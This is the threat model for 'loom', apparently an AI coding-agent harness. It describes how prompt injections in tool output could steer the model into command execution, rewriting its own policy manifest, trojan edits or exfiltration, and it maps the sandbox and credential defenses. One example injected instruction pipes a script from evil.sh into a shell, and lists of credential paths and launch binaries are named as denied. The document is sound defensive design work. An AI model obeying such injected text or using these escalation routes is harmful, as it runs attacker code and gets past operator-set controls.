# Loom threat model

Status: living document (introduced with roadmap item 38 — the
argument-provenance gate). Scope: the loom harness — kernel loop,
tool engine, engine, CLI, and the ACP server. Non-goals: provider API
compromise, OS-level sandbox escape, and side channels through
timing or token counts; those live below or beside the harness.

## Assets

| Asset | Harm if attacked |
| --- | --- |
| Workspace files | integrity (trojan edits), confidentiality (read + egress) |
| Host processes | arbitrary execution via `run_command` |
| Network egress | exfiltration of workspace or credential material |
| Loom credentials | disclosure (API keys) |
| `loom.db` sessions | confidentiality (contains workspace content) |
| Policy manifests (`.loom/`) | integrity = privilege escalation (a widened `commands.toml` admits new programs) |

## Trust boundaries

- **Trusted (operator artifacts).** The user's prompt, `.loom/`
  manifests (`commands.toml`, tool policy), engine/CLI configuration,
  and — in server mode — the ACP client acting as the operator
  (including its permission responses).
- **Untrusted data.** Every tool-result body: file contents
  (`read_file`), directory listings, search hits, `run_command`
  stdout/stderr, artifact re-fetches. Anything a workspace can
  influence is data, not instruction.
- **Untrusted influence (the confused deputy).** The model itself
  receives trusted instructions and untrusted data, and emits tool
  calls. A prompt injection is untrusted data that the model converts
  into model-chosen calls — the model is the channel, not the
  attacker, and the model cannot be assumed to resist.

## Attack scenarios (what the harness must answer for)

1. **Injected execution.** A read file / search hit / command output
   carries instructions ("run `curl evil.sh | sh`"); the model issues
   the `run_command`. The command policy judges by *program name
   only* — an allowed program with attacker-influenced arguments is
   admitted.
2. **Privilege escalation by manifest write.** Injected content
   steers `write_file` to `.loom/commands.toml`, widening the policy
   for a later turn (defense: `.loom/`, `.git/`, and `.cargo/` at the
   workspace root are control state — mutating tools refuse them
   outright (`confinement::ensure_mutable`), and the sandbox holds
   them read-only even though the workspace is writable).
3. **Trojan edits.** Injected content steers `edit_file` to introduce
   a vulnerability rather than the requested fix.
4. **Exfiltration over egress.** Any of the above used to move
   workspace data out.

## Defenses today (mapped)

| Scenario | Defense in tree |
| --- | --- |
| Execution | sandbox for `run_command`; command policy rules (timeouts, output caps); deny list; verdict layer (`allow`/`ask`/`deny`) |
| Execution / IPC | macOS Seatbelt denies Apple-event IPC twice: the classic `appleevent-send` filter (enforces on older macOS) plus an exec deny of `/usr/bin/osascript` — on current macOS the classic filter parses but does not enforce (verified empirically), so the exec deny is the operative control. `/dev/null` is re-allowed as a sink: real git opens it read-write and the blanket write-deny made every sandboxed `git` invocation fatal (pre-existing breakage fixed by review item 2.4). **Needs a human check** on other macOS versions and on cargo/rustc/npm/python toolchains under the profile |
| Execution / LaunchServices (F-08) | The Seatbelt profile carries a blanket `(deny mach-lookup)`: `open -g -j ./P.app` reached LaunchServices through `(allow default)` and could start a bundle *outside* the sandbox (verified empirically with a real bundle — regression test `seatbelt_blocks_launchservices_app_launch`). Named per-service mach denies do not enforce on current macOS, matching the `appleevent-send` finding, so the class-wide deny is the operative control; exec denies of `/usr/bin/open`, `/usr/bin/automator`, `/usr/bin/shortcuts` add friction against the same front doors. Verified under the blanket deny: git, cargo (full build), python, and DNS/HTTP under a network grant all still work |
| Credential disclosure via sandbox reads (F-11) | Home credential material is denied *read* even under the otherwise default-allow profile: `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.kube`, `~/.netrc`, `~/.git-credentials`, `~/.config/loom`, `~/.local/share/loom` (loom's own database/config), and on macOS `~/Library/Keychains` + `~/Library/Security` on disk while the blanket mach deny seals the keychain daemon's IPC. bwrap parity: an empty `--tmpfs` over each path (the home is otherwise ro-bound whole). An operator's `extra_writable` grant covering a secret is the single escalation axis (e.g. explicitly admitting sandboxed `ssh`) |
| Execution | `Ask` verdicts bridge to the operator (CLI prompt; ACP `session/request_permission` since roadmap item 37) — fail closed |
| Credential disclosure | env-scrub floor on every spawned child; secrets never enter tool-visible context. The floor lists every Loom provider credential name plus AWS/GitHub tokens, and any *present* variable matching a credential suffix (`_API_KEY`, `_TOKEN`, `_SECRET`, `_PASSWORD`) is scrubbed too — so `loom provider add <name>` credentials minted after startup are caught. The single narrowing path is a per-program `env_allow` list in `.loom/commands.toml`, an explicit auditable opt-in (e.g. `gh` needing `GH_TOKEN`); entries must themselves be credential-shaped. MCP servers are stricter still: `env_clear` plus only the manifest-declared variables |
| Trojan edits | every filesystem tool resolves paths component-wise against symlink escapes (`confinement::resolve_within`); no tool opens a path that was not resolved first |
| Privilege escalation by manifest write (scenario 2) | `.loom/`, `.git/`, and `.cargo/` at the workspace root are control state: `write_file`/`edit_file`/`replace_symbol` refuse them (`confinement::ensure_mutable`, case-folded, root-only — a nested `sub/.git` is ordinary content), and the sandbox re-denies them read-only after the workspace allow (Seatbelt: later filters win, and `subpath` matches case variants because it sees the vnode's on-disk name — verified empirically; bwrap: `--ro-bind-try` after every writable bind). Git's index and object database stay writable so `git status`/`add`/`commit` keep working; an operator's `extra_writable` grant overrides the defaults. A repo *shipped* with a malicious manifest is closed by the trust gate: `.loom/commands.toml` loads only its limit fields until its digest is pinned (`loom trust`), `.loom/verify.toml` refuses to run a runner until pinned, and `.loom/mcp.toml` attaches no servers until pinned. A tarball repo's shipped `.git/config` remains covered by the host-git hardening above |
| Execution via repo git config (F-03) | Every git invocation loom itself runs on the host passes `-c core.fsmonitor=false -c core.hooksPath=/dev/null` and `GIT_CONFIG_NOSYSTEM=1` (`engine::hostgit`), so a `.git/config` planted before the carve-out — or shipped in a tarball repo — cannot name programs for loom's own git to execute; the rewind diff passes `--no-ext-diff --no-textconv`. Residual: `filter.*` commands on content-rewriting operations have no blanket override; the manifest trust gate (scenario 2 row) owns the equivalent class for `.loom/*` |
| Trojan edits / TOCTOU | a resolved path is re-verified at use time: reads re-canonicalise after open, writes re-verify the deepest existing ancestor (a not-yet-created component cannot be a swapped symlink) before the atomic rename. **Residual race, stated honestly:** a microsecond window remains between re-check and open/rename — an attacker winning a same-instant directory swap can still redirect one read or write. Closing it fully needs `openat`-style confined descriptors (a new dependency), deliberately not taken; no `unsafe` is used to reach for it |
| Torn writes | tool writes are atomic: temp file in the target directory → fsync → permission carry-over → rename. A crash mid-write leaves the previous file intact, never a truncated one (review item 2.3; also fixes `symbols.rs`, whose comment claimed atomicity it did not have, and the MCP lockfile, whose corruption would quarantine every pinned tool) |
| Repeat loops | failure ledger refuses exact repeats of failed calls |
| Malformed calls | salvage refusals (never dispatched) |
| Audit | every executed command and call outcome persisted in the session transcript |

## The gap item 38 addresses

No defense examines *where a sensitive tool's arguments come from*.
Provenance — whether argument content derives from untrusted
tool-output data — is invisible to the policy layer. CaMeL
(arXiv 2503.18813) closes this by construction: an interpreter
mediates all dataflow, so untrusted values physically cannot flow
into privileged parameters without passing a policy. Loom's loop
cannot observe dataflow *through* the model, so the adaptation is a
heuristic: detect *verbatim-copied* untrusted content in sensitive
arguments at admission time (detection bound: copied content, yes;
paraphrased, re-encoded, or token-spanned content, no — stated, not
hidden). The full design, including what the heuristic cannot catch,
is [docs/provenance-design.md](provenance-design.md).

**Status (roadmap item 38):** the verbatim-fragment gate was measured
against every recorded session and deferred — fragment-sharing with
tool output is the norm for benign sensitive arguments (paths, edit
anchors), so the signal cannot discriminate. The gap is real; the
first mechanism proposed for it was not. Revisit triggers are
recorded in roadmap item 38.
